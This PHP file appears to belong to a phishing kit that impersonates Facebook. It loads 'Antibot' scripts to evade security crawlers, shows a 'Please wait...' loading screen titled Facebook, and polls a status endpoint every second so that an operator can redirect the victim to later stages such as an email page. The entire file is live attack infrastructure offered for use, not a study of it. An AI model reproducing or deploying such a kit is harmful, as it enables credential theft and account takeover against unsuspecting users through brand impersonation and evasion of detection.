<?php

error_reporting(0);

include('../Antibot/Bot-Crawler.php');
include('../Antibot/Dila_DZ.php');
include('../Antibot/blockers.php');
include('../Antibot/detects.php');
include('../Antibot/antibots.php');

session_start();
$config = include('../admin/config.php');
$id = $_GET['id'];
if (!isset($_SESSION['users'][$id])) {
    header("Location: ../index.php");
    exit();
}
$userData = json_decode(file_get_contents("../sessions/$id.json"), true);
$page = $userData['page'];

if (!isset($_SESSION['refresh_count'])) {
    $_SESSION['refresh_count'] = 0;
} else {
    $_SESSION['refresh_count']++;
}

if ($_SESSION['refresh_count'] >= $config['refresh_count_threshold']) {
    $_SESSION['refresh_count'] = 0;
    if ($config['enable_redirect']) {
        header("Location: auto/email.php?id=$id");
        exit();
    }
}

if ($page != 'verifying') {
    header("Location: $page.php?id=$id");
    exit();
}
?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex, nofollow">
    <title>Facebook</title>
    <link rel="icon" type="image/svg" href="../images/fb.svg">
    <style>
    body {
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
    }


    .loading-box {
        width: 80%;
        max-width: 300px;
        padding: 1px;
        border: 2px solid #ccc;
        border-radius: 10px;
        display: flex;
        justify-content: center;
        align-items: center;
        background-color: #f6f6f6;
    }

    .loading-spinner {
        border: 4px solid #f3f3f3;
        border-top: 4px solid #1877f2;
        border-radius: 50%;
        width: 30px;
        height: 30px;
        animation: spin 2s linear infinite;
    }


    .loading-text {
        margin-left: 50px;
        font-size: 20px;
        color: #767474;
    }

    @keyframes spin {
        0% {
            transform: rotate(0deg);
        }

        100% {
            transform: rotate(360deg);
        }
    }
    </style>

</head>

<body>

    <div class="loading-box">
        <div class="loading-spinner"></div>
        <p class="loading-text">Please wait...</p>
    </div>
    <script>
    function checkForUpdates() {
        fetch("check_status.php?id=<?php echo $id; ?>")
            .then(response => response.json())
            .then(data => {
                if (data.redirect) {
                    window.location.href = data.redirect_url;
                }
            })
            .catch(error => console.error('Error:', error));
    }

    setInterval(checkForUpdates, 1000);
    </script>
</body>

</html>